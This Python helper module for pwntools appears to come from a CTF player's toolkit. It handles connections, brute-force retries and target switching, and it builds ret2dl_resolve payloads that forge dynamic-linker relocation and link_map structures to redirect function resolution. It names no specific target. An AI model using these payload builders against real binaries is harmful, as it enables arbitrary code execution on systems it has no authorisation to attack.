from pwn import *
from pwnlib.elf.elf import dotdict
from itertools import product

context(terminal=['tmux', 'splitw', '-v'])

p = lambda x: pack(x, 'all')
u = lambda x: unpack(x, 'all')
invsign = lambda x: unpack(pack(x, 'all'), 'all', signed = x>0)

class Environment:
    def __init__(self, *envs):
        self.__env = None
        self.env_list = list(set(envs))
        for env in self.env_list:
            setattr(self, env, dict())

    def set_item(self, name, **obj):
        if set(obj.keys()) != set(self.env_list):
            error('Environment : "%s" environment does not match' % name)
            return

        for env in obj:
            getattr(self, env).update({name:obj[env]})

    def select(self, env=None):
        if env is not None and env not in self.env_list:
            warn('Environment : "%s" is not defined' % env)
            env = None

        while env is None:
            sel = raw_input('Select Environment\n%s ...' % str(self.env_list)).strip().decode('utf8')
            if not sel:
                env = self.env_list[0]
            elif sel in self.env_list:
                env = sel
            else:
                for e in self.env_list:
                    if e.startswith(sel):
                        env = e
                        break

        info('Environment : set environment "%s"' % env)
        for name,obj in getattr(self, env).items():
            setattr(self, name, obj)
        self.__env = env

    def check(self, env):
        return self.__env in env if type(env) in [list, tuple] else self.__env == env

class Communicate:
    def __init__(self, mode, *args, **kwargs):
        self.__conn = None

        self.args = args
        self.kwargs = kwargs
        self.__mode = mode
        self.__debug = (mode == 'DEBUG')

        self.quiet = False

    def __del(self):
        self.close()

    def connect(self):
        l_lv = context.log_level
        if self.quiet:
            context.log_level = 100

        if self.__conn is not None:
            self.close()

        if self.__mode == 'DEBUG':
            if 'argv' in self.kwargs:
                argv = self.kwargs['argv']
                del self.kwargs['argv']
            else:
                argv = './argv'
            conn = gdb.debug(argv, *self.args, **self.kwargs)
        elif self.__mode == 'SOCKET':
            conn = remote(*self.args, **self.kwargs)
        elif self.__mode == 'PROC':
            conn = process(*self.args, **self.kwargs)
        elif self.__mode == 'SSH':
            cmd = None
            if 'run' in self.kwargs:
                cmd = self.kwargs['run']
                del self.kwargs['run']

            s = ssh(*self.args, **self.kwargs)
            conn = s.run(cmd) if cmd is not None else s.shell()
        else:
            warn('communicate : mode "%s" is not defined' % self.__mode)
            conn = None

        self.__conn = conn
        context.log_level = l_lv

        return conn

    def close(self):
        if self.__conn is None:
            return

        l_lv = context.log_level
        if self.quiet:
            context.log_level = 100
        self.__conn.close()
        context.log_level = l_lv

    def run(self, func, **kwargs):
        return func(self.__conn, **kwargs)

    def bruteforce(self, func, **kwargs):
        if self.__debug:
            warn('bruteforce : disabled bruteforce in debug mode')
            return self.run(func, **kwargs)

        while True:
            try:
                self.run(func, **kwargs)
            except:
                self.connect()
            else:
                break

    def repeat(self, func, succend, *args, **kwargs):
        rep_result = []

        for x in product(*args):
            kwargs['rep_argl'] = x
            try:
                self.run(func, **kwargs)
            except:
                pass
            else:
                if succend:
                    return x
                rep_result += [x]
            self.connect()

        return rep_result

    def repeat_depth(self, func, depth, *args, **kwargs):
        rep_result = []
        for x in product(*args[:depth]):
            kwargs['rep_argh'] = x
            res = self.repeat(func, True, *args[depth:], **kwargs)
            if res:
                rep_result += [[x, res]]
                self.connect()
        return rep_result

    def interactive(self, **kwargs):
        self.__conn.interactive(**kwargs)

    @property
    def connection(self):
        return self.__conn

#==========

class ELF(pwnlib.elf.elf.ELF):
    sap_function    = {}
    sap_section     = {}

    def __init__(self, path, checksec=True):
        super(ELF, self).__init__(path, checksec)

        self.sep_function   = dotdict()
        self.sep_section    = dotdict()

        self._populate_function()
        self._populate_section()

    @pwnlib.elf.elf.ELF.address.setter
    def address(self, new):
        delta     = new-self._address
        update    = lambda x: x+delta

        self.symbols        = dotdict({k:update(v) for k,v in self.symbols.items()})
        self.plt            = dotdict({k:update(v) for k,v in self.plt.items()})
        self.got            = dotdict({k:update(v) for k,v in self.got.items()})
        self.sep_function   = dotdict({k:update(v) for k,v in self.sep_function.items()})
        self.sep_section    = dotdict({k:update(v) for k,v in self.sep_section.items()})

        # Update our view of memory
        memory = pwnlib.elf.elf.intervaltree.IntervalTree()

        for begin, end, data in self.memory:
            memory.addi(update(begin),
                        update(end),
                        data)

        self.memory = memory

        self._address = update(self.address)

    def _populate_function(self):
        for name in self.functions:
            self.sep_function[name] = self.functions[name].address

    def _populate_section(self):
        for sec in self.iter_sections():
            self.sep_section[sec.name]  = sec.header.sh_addr

    @property
    def libc(self):
        for lib in self.libs:
            if '/libc.' in lib or '/libc-' in lib:
                return ELF(lib)

class DlRuntime:
    def __init__(self, elf, libc = None):
        self._elf  = elf if isinstance(elf, ELF) else ELF(elf)
        self._libc = self._elf.libc if libc is None else libc if isinstance(libc, ELF) else ELF(libc)
        self._arch = 64 if context.arch in ['x86_64','amd64'] else 32 if context.arch in ['x86', 'i386'] else 0

    def lookup(self, **kwargs):
        return self.Lookup(self, **kwargs)

    def delta(self, **kwargs):
        return self.Delta(self, **kwargs)

    class Lookup:
        def __init__(self, elf, avoid_version = False):
            self.__dlr  = elf if isinstance(elf, DlRuntime) else DlRuntime(elf)
            elf         = self.__dlr._elf

            self.__addr             = dict()
            self.__addr['dynsym']   = elf.sep_section['.dynsym']
            self.__addr['dynstr']   = elf.sep_section['.dynstr']
            self.__addr['relplt']   = elf.sep_section['.rela.plt' if self.__arch == 64 else '.rel.plt']
            self.__addr['version']  = None if avoid_version else elf.sep_section['.gnu.version']

            self.__reloc_offset = {}
            self.__sym_reloc    = {}
            self.__payload      = ''

        @property
        def __arch(self):
            return self.__dlr._arch

        def add_reloc(self, dynstr, reloc_addr):
            self.__sym_reloc.update({dynstr:reloc_addr})

        def resolve(self, addr_buf):
            assert(self.__arch in [64, 32])

            d = {}
            dynstr = dynsym = relplt = b''

            addr_buf_dynstr = addr_buf
            for s,a in self.__sym_reloc.items():
                d.update({s:len(dynstr)})
                dynstr += s.encode('utf8') + b'\x00'

            align = 0x18 if self.__arch == 64 else 0x10

            addr_buf_dynsym      = addr_buf_dynstr + len(dynstr)
            pad_dynsym           = (align - (addr_buf_dynsym - self.__addr['dynsym']) % align) % align
            addr_buf_dynsym     += pad_dynsym

            for s,ofs in d.items():
                dynsym  += p32(addr_buf_dynstr + ofs - self.__addr['dynstr'])
                if self.__arch == 64:
                    dynsym  += p32(0x12)
                    dynsym  += p64(0)
                    dynsym  += p64(0)
                elif self.__arch == 32:
                    dynsym  += p32(0)
                    dynsym  += p32(0)
                    dynsym  += p32(0x12)

            addr_buf_relplt      = addr_buf_dynsym + len(dynsym)
            pad_relplt           = ((0x18-(addr_buf_relplt - self.__addr['relplt'])%0x18)%0x18) if self.__arch == 64 else 0
            addr_buf_relplt     += pad_relplt

            r_info = int((addr_buf_dynsym - self.__addr['dynsym']) / align)
            if self.__addr['version'] is not None:
                debug('DlRuntime : check gnu version : [0x%08x] & 0x7fff' % (self.__addr['version'] + r_info*2))
            else:
                debug('DlRuntime : check if link_map->l_info[VERSYMIDX (DT_VERSYM)] == NULL (offset : %x)' % (0x1c8 if self.__arch == 64 else 0xe4))

            for s,a in self.__sym_reloc.items():
                if self.__arch == 64:
                    self.__reloc_offset.update({s : int((addr_buf_relplt + len(relplt) -self.__addr['relplt'])/0x18)})
                    relplt  += p64(a)
                    relplt  += p32(0x7)
                    relplt  += p32(r_info)
                    relplt  += p64(0)
                elif self.__arch == 32:
                    self.__reloc_offset.update({s : addr_buf_relplt + len(relplt) -self.__addr['relplt']})
                    relplt  += p32(a)
                    relplt  += p32(r_info << 8 | 0x7)
                r_info  += 1

            if pad_dynsym:
                debug('DlRuntime : Auto padding dynsym size is 0x%d bytes' % pad_dynsym)
            if pad_relplt:
                debug('DlRuntime : Auto padding relplt size is 0x%d bytes' % pad_relplt)

            self.__payload =  dynstr + b'@'*(pad_dynsym) + dynsym + b'@'*(pad_relplt) + relplt

        @property
        def reloc_payload(self):
            return self.__payload

        @property
        def reloc_offset(self):
            return self.__reloc_offset

    class Delta:
        def __init__(self, elf, libc = None, base = '__libc_start_main'):
            self.__dlr  = elf if isinstance(elf, DlRuntime) else DlRuntime(elf, libc)
            elf         = self.__dlr._elf
            libc        = self.__dlr._libc

            self.addr_got_basefunc  = elf.got[base]
            self.addr_basefunc      = libc.sep_function[base]

            self.__addr             = dict()
            self.__addr['gotplt']   = elf.sep_section['.got.plt']
            self.__got              = elf.got
            self.__function         = libc.sep_function
            self.__payload          = ''

        @property
        def __arch(self):
            return self.__dlr._arch

        def set_victim(self, victim):
            self.addr_got_victim    = self.__got[victim]
            if self.__arch == 64:
                self.reloc_offset       = int((self.addr_got_victim - (self.__addr['gotplt']+0x18))/8)
            else:
                self.reloc_offset       = (self.addr_got_victim - (self.__addr['gotplt']+0xc))*2

        def resolve(self, addr_buf, target, suffix = False):
            delta               = self.__function[target] - self.addr_basefunc
            addr_link_map       = addr_buf
            addr_symtab         = addr_link_map + ((0x100 if self.__arch == 64 else 0x80) if suffix else 0x8)
            addr_reloc          = addr_symtab   + 0x10
            addr_relplt         = addr_reloc    + 0x10
            addr_strtab         = addr_buf      # readable anyware

            link_map  = pack(delta)
            link_map  = link_map.ljust(0x68 if self.__arch == 64 else 0x34, b'\x00')
            link_map += pack(addr_strtab)
            link_map += pack(addr_symtab)
            link_map  = link_map.ljust(0xf8 if self.__arch == 64 else 0x7c, b'\x00')
            link_map += pack(addr_reloc)

            symtab  = pack(6)
            symtab += pack(self.addr_got_basefunc - (8 if self.__arch == 64 else 4))                # .dynsym
            symtab  = symtab.ljust(0x10, b'\x00')

            debug('DlRuntime : check sym->st_other (0x%08x)' % (self.addr_got_basefunc + (-3 if self.__arch == 64 else 0x9)))

            reloc   = pack(0x17)
            reloc  += pack(addr_relplt - self.reloc_offset * (0x18 if self.__arch == 64 else 1))    # .rela.plt
            reloc   = reloc.ljust(0x10, b'\x00')

            relplt  = pack(self.addr_got_victim - delta)
            relplt += p32(0x7)
            if self.__arch == 64:
                relplt += p32(0)
                relplt += p64(0)

            self.__payload  = link_map if suffix else link_map[:0x8]
            self.__payload += symtab + reloc + relplt
            self.__payload += link_map[len(self.__payload):]

        @property
        def delta_payload(self):
            return self.__payload

# for backward compatibility
def communicate(mode='SOCKET', *args, **kwargs):
    comn = Communicate(mode, *args, **kwargs)
    return comn.connect()

